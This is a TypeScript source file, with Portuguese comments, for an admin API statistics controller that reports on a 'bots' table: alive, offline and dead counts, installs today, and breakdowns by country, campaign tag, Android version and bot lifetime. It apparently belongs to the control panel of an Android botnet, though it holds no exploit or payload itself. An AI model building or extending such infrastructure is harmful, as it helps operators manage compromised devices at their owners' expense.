// api/src/admin-api/stats.ts
// Controlador de Estatísticas para API administrativa
// Adaptado de admin.class.php (draw com action == "stats")

import { SupabaseClient } from '@supabase/supabase-js';

// ----------------------------------------------------------------------
// Tipos
// ----------------------------------------------------------------------
export interface OverviewStats {
  total: number;
  alive: number;
  offline: number;
  dead: number;
  installed_today: number;
}

export interface CountryStats {
  country: string;
  total: number;
  alive: number;
  offline: number;
  dead: number;
  installed_today: number;
}

export interface TagStats {
  tag: string;
  total: number;
  countries: { country: string; count: number }[];
}

export interface LifetimeStats {
  bot_id: string;
  android: string;
  registered: string;
  last_seen: string;
  lifetime_seconds: number;
  lifetime_text: string;
}

export interface DayStats {
  date: string;   // 'YYYY-MM-DD'
  count: number;
}

export interface AndroidStats {
  android: string;
  count: number;
}

export interface CommandResult {
  success: boolean;
  message?: string;
  data?: any;
}

// ----------------------------------------------------------------------
// Constantes de tempo (em milissegundos)
// ----------------------------------------------------------------------
const ALIVE_MS = 5 * 60 * 1000;          // 5 minutos
const OFFLINE_MS = 12 * 60 * 60 * 1000;  // 12 horas

// ----------------------------------------------------------------------
// Função auxiliar: obter início do dia (UTC)
// ----------------------------------------------------------------------
function startOfToday(): Date {
  const now = new Date();
  now.setUTCHours(0, 0, 0, 0);
  return now;
}

// ----------------------------------------------------------------------
// Função auxiliar: formatar duração em texto legível (ex.: "2d 3h 4m")
// ----------------------------------------------------------------------
function formatDuration(seconds: number): string {
  const days = Math.floor(seconds / 86400);
  const hours = Math.floor((seconds % 86400) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;

  let result = '';
  if (days > 0) result += `${days}d `;
  if (hours > 0 || days > 0) result += `${hours}h `;
  result += `${minutes}m ${secs}s`;
  return result.trim();
}

// ----------------------------------------------------------------------
// getOverview – total, alive, offline, dead, installed_today
// ----------------------------------------------------------------------
export async function getOverview(
  supabase: SupabaseClient,
): Promise<OverviewStats> {
  try {
    const now = Date.now();
    const aliveSince = new Date(now - ALIVE_MS).toISOString();
    const offlineSince = new Date(now - OFFLINE_MS).toISOString();
    const todayStart = startOfToday().toISOString();

    // Contagens individuais
    const [totalRes, aliveRes, offlineRes, deadRes, installedTodayRes] = await Promise.all([
      supabase.from('bots').select('id', { count: 'exact', head: true }),
      supabase.from('bots').select('id', { count: 'exact', head: true }).gte('last_seen', aliveSince),
      supabase.from('bots').select('id', { count: 'exact', head: true })
        .gte('last_seen', offlineSince)
        .lt('last_seen', aliveSince),
      supabase.from('bots').select('id', { count: 'exact', head: true }).lt('last_seen', offlineSince),
      supabase.from('bots').select('id', { count: 'exact', head: true }).gte('registered', todayStart),
    ]);

    return {
      total: totalRes.count || 0,
      alive: aliveRes.count || 0,
      offline: offlineRes.count || 0,
      dead: deadRes.count || 0,
      installed_today: installedTodayRes.count || 0,
    };
  } catch (err) {
    console.error('getOverview error:', err);
    throw err;
  }
}

// ----------------------------------------------------------------------
// getCountryStats – distribuição por país
// ----------------------------------------------------------------------
export async function getCountryStats(
  supabase: SupabaseClient,
): Promise<CountryStats[]> {
  try {
    // Buscar todos os bots com campos relevantes
    const { data: bots, error } = await supabase
      .from('bots')
      .select('country, registered, last_seen');

    if (error) throw error;
    if (!bots || bots.length === 0) return [];

    const now = Date.now();
    const aliveSince = now - ALIVE_MS;
    const offlineSince = now - OFFLINE_MS;
    const todayStart = startOfToday().getTime();

    // Agrupar por país
    const map = new Map<string, CountryStats>();

    for (const bot of bots) {
      const country = bot.country || '?';
      if (!map.has(country)) {
        map.set(country, {
          country,
          total: 0,
          alive: 0,
          offline: 0,
          dead: 0,
          installed_today: 0,
        });
      }

      const stats = map.get(country)!;
      stats.total++;

      const lastSeen = new Date(bot.last_seen).getTime();
      const registered = new Date(bot.registered).getTime();

      if (registered >= todayStart) {
        stats.installed_today++;
      }

      if (lastSeen >= aliveSince) {
        stats.alive++;
      } else if (lastSeen >= offlineSince) {
        stats.offline++;
      } else {
        stats.dead++;
      }
    }

    // Converter para array e ordenar por total decrescente
    return Array.from(map.values()).sort((a, b) => b.total - a.total);
  } catch (err) {
    console.error('getCountryStats error:', err);
    throw err;
  }
}

// ----------------------------------------------------------------------
// getTagStats – agrupa por tag e mostra contagem por país
// ----------------------------------------------------------------------
export async function getTagStats(
  supabase: SupabaseClient,
): Promise<TagStats[]> {
  try {
    const { data: bots, error } = await supabase
      .from('bots')
      .select('tag, country');

    if (error) throw error;
    if (!bots || bots.length === 0) return [];

    // Agrupar por tag
    const tagMap = new Map<string, Map<string, number>>();

    for (const bot of bots) {
      const tag = bot.tag || '?';
      const country = bot.country || '?';

      if (!tagMap.has(tag)) {
        tagMap.set(tag, new Map());
      }
      const countryMap = tagMap.get(tag)!;
      countryMap.set(country, (countryMap.get(country) || 0) + 1);
    }

    // Montar resultado
    const result: TagStats[] = [];
    for (const [tag, countryMap] of tagMap.entries()) {
      const total = Array.from(countryMap.values()).reduce((a, b) => a + b, 0);
      const countries = Array.from(countryMap.entries())
        .map(([country, count]) => ({ country, count }))
        .sort((a, b) => b.count - a.count);

      result.push({ tag, total, countries });
    }

    // Ordenar por total decrescente
    result.sort((a, b) => b.total - a.total);
    return result;
  } catch (err) {
    console.error('getTagStats error:', err);
    throw err;
  }
}

// ----------------------------------------------------------------------
// getLifetimeStats – top 10 bots com maior tempo de vida
// ----------------------------------------------------------------------
export async function getLifetimeStats(
  supabase: SupabaseClient,
): Promise<LifetimeStats[]> {
  try {
    const { data: bots, error } = await supabase
      .from('bots')
      .select('bot_id, android, registered, last_seen');

    if (error) throw error;
    if (!bots || bots.length === 0) return [];

    const lifetimeStats: LifetimeStats[] = bots.map((bot) => {
      const registered = new Date(bot.registered).getTime();
      const lastSeen = new Date(bot.last_seen).getTime();
      const lifetimeSeconds = Math.max(0, Math.floor((lastSeen - registered) / 1000));

      return {
        bot_id: bot.bot_id,
        android: bot.android,
        registered: bot.registered,
        last_seen: bot.last_seen,
        lifetime_seconds: lifetimeSeconds,
        lifetime_text: formatDuration(lifetimeSeconds),
      };
    });

    // Ordenar por tempo de vida decrescente e pegar os 10 primeiros
    lifetimeStats.sort((a, b) => b.lifetime_seconds - a.lifetime_seconds);
    return lifetimeStats.slice(0, 10);
  } catch (err) {
    console.error('getLifetimeStats error:', err);
    throw err;
  }
}

// ----------------------------------------------------------------------
// getLastWeekStats – registros por dia nos últimos 7 dias
// ----------------------------------------------------------------------
export async function getLastWeekStats(
  supabase: SupabaseClient,
): Promise<DayStats[]> {
  try {
    const { data: bots, error } = await supabase
      .from('bots')
      .select('registered');

    if (error) throw error;

    // Inicializar últimos 7 dias (incluindo hoje)
    const days: DayStats[] = [];
    for (let i = 6; i >= 0; i--) {
      const d = new Date();
      d.setUTCDate(d.getUTCDate() - i);
      d.setUTCHours(0, 0, 0, 0);
      const dateStr = d.toISOString().slice(0, 10);
      days.push({ date: dateStr, count: 0 });
    }

    if (!bots || bots.length === 0) return days;

    // Mapa para contagem rápida
    const dayMap = new Map(days.map((d) => [d.date, d]));

    for (const bot of bots) {
      const registered = new Date(bot.registered);
      const dateStr = registered.toISOString().slice(0, 10);
      if (dayMap.has(dateStr)) {
        dayMap.get(dateStr)!.count++;
      }
    }

    return days;
  } catch (err) {
    console.error('getLastWeekStats error:', err);
    throw err;
  }
}

// ----------------------------------------------------------------------
// getAndroidStats – distribuição por versão Android
// ----------------------------------------------------------------------
export async function getAndroidStats(
  supabase: SupabaseClient,
): Promise<AndroidStats[]> {
  try {
    const { data: bots, error } = await supabase
      .from('bots')
      .select('android');

    if (error) throw error;
    if (!bots || bots.length === 0) return [];

    const map = new Map<string, number>();
    for (const bot of bots) {
      const android = bot.android || 'unknown';
      map.set(android, (map.get(android) || 0) + 1);
    }

    const result: AndroidStats[] = Array.from(map.entries())
      .map(([android, count]) => ({ android, count }))
      .sort((a, b) => b.count - a.count);

    return result;
  } catch (err) {
    console.error('getAndroidStats error:', err);
    throw err;
  }
}

// ----------------------------------------------------------------------
// getStats – agrega todas as estatísticas em um único objeto
// ----------------------------------------------------------------------
export async function getStats(
  supabase: SupabaseClient,
): Promise<{
  overview: OverviewStats;
  countries: CountryStats[];
  tags: TagStats[];
  lifetime: LifetimeStats[];
  lastWeek: DayStats[];
  android: AndroidStats[];
}> {
  try {
    const [overview, countries, tags, lifetime, lastWeek, android] = await Promise.all([
      getOverview(supabase),
      getCountryStats(supabase),
      getTagStats(supabase),
      getLifetimeStats(supabase),
      getLastWeekStats(supabase),
      getAndroidStats(supabase),
    ]);

    return {
      overview,
      countries,
      tags,
      lifetime,
      lastWeek,
      android,
    };
  } catch (err) {
    console.error('getStats error:', err);
    throw err;
  }
}